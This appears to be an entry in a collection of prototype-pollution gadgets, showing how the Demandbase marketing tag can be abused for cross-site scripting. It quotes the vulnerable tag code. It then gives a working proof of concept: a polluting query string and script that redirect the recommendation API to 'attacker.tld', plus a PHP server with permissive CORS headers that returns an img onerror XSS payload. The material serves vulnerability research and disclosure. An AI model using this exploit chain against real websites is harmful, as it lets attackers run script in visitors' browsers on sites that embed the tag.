## Demandbase Tag

URL: https://support.demandbase.com/hc/en-us/articles/115005051743-What-is-a-Demandbase-Tag-

### JS Fingerprint
```js
return (typeof Demandbase != 'undefined')
```

### Vulnerable code fragment

https://tag.demandbase.com/be33254a43aa5a3a.js

```js
(function(Config) {
  
  ...
  
  Config.SiteOptimization = window.Demandbase.Config.SiteOptimization || {};
  
  ...
  
})(Config = Demandbase.Config || (Demandbase.Config = {}));
```

```js
function SiteOptimizationLoaderModule(config) {
  var _this = _super.call(this) || this;
  _this.SO_REMOTE_MODULE_URL = "https://tag.demandbase.com/shared/siteOptimization_2343aad66e.min.js";
  _this.REMOTE_STYLESHEET_URL = "https://tag.demandbase.com/shared/siteOptimization_2343aad66e.css";
  _this.DEFAULT_CONFIGURATION = {
    
    ...
    
  };
  _this.configuration = {};
  _this.inserted = false;
  _super.prototype.mergeConfigs.call(_this, _this.DEFAULT_CONFIGURATION, config || Demandbase.Config.SiteOptimization);
  _this.configuration.recommendationKey = Demandbase.Config.key;
  return _this;
}
```

https://tag.demandbase.com/shared/siteOptimization_2343aad66e.min.js

```js
getRecommendations: function (e, t, i, n, o, a) {
  var s = new XMLHttpRequest,
  r = window.btoa(t),
  l = (a || this.configuration.recommendationApiURL) + encodeURI(e) + '?page=' + encodeURI(r) + '&apiKey=' + encodeURI(i);
  !0 === this.configuration.solveConversionProbabilities && (l += '&solveConversionProbabilities=true'),
  s.open('GET', l, !0),
  s.withCredentials = !0,
  s.onload = function () {
    if (200 <= s.status && s.status < 400) {
      var e = Demandbase.Shims.JSON.parse(s.responseText);
      n && n(e)
    } else o && o()
  },
  s.onerror = function () {
    o()
  },
  s.send()
}

...

buildRecommendationsItems: function (e, t, i) {
  
  ...
  
  for (var r = '', l = '', c = 0; c < o; c++) {
    
    ...
    
    r += '<li class="' + this.CLASS_LIST_ITEM + ' affect"' + l + '>',
    
    ...
    
    r += '<div class="recommended-block__list__recommended-item__image-wrapper"><div class="recommended-block__list__recommended-item__image-table-row-wrapper"><div class="recommended-block__list__recommended-item__image-table-cell-wrapper"><a onclick="window.Demandbase.SiteOptimization.itemOnClick(event)" href="' + d + t[c].page + '"><img src="' + t[c].image + '" alt="Preview" class="recommended-block__list__recommended-item__img"></div></div></a><a onclick="window.Demandbase.SiteOptimization.itemOnClick(event)" class="' + this.CLASS_LIST_ITEM_TITLE + '" href="' + d + t[c].page + '">' + m + u + '</a></div></li>'
  }
  n.innerHTML = r
}
```

### PoC

```
?__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?
```

```html
<script>
    Object.prototype.Config = {SiteOptimization: {enabled: 1, recommendationApiURL: "//attacker.tld/json_cors.php?"}}
</script>

<script>
    (function(a,b,c,d,e){a=b.createElement(c);b=b.getElementsByTagName(c)[0];a.async=1;a.id=e;a.src=d;b.parentNode.insertBefore(a,b)})(window,document,"script","https://tag.demandbase.com/be33254a43aa5a3a.min.js","demandbase_js_lib");
</script>
```

```php
<?php
  
  if ($_SERVER ['HTTP_ORIGIN'])
  {
    $origin = $_SERVER ['HTTP_ORIGIN'];
  }
  else
  {
    preg_match ('/^https?:\/\/[^\/]+/', $_SERVER ['HTTP_REFERER'], $matches);
    
    $origin = $matches [0];
  }
  
  header ('Access-Control-Allow-Origin: '.$origin);
  header ('Access-Control-Allow-Credentials: true');
  header ('Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, HEAD');
  header ('Content-Type: application/json');
  
  http_response_code (201);
  
  echo '{"company_name":"XSS","recommendations":[{"title":"<img src=x onerror=alert(document.domain)>"}],"should_display":true}';
  
?>
```
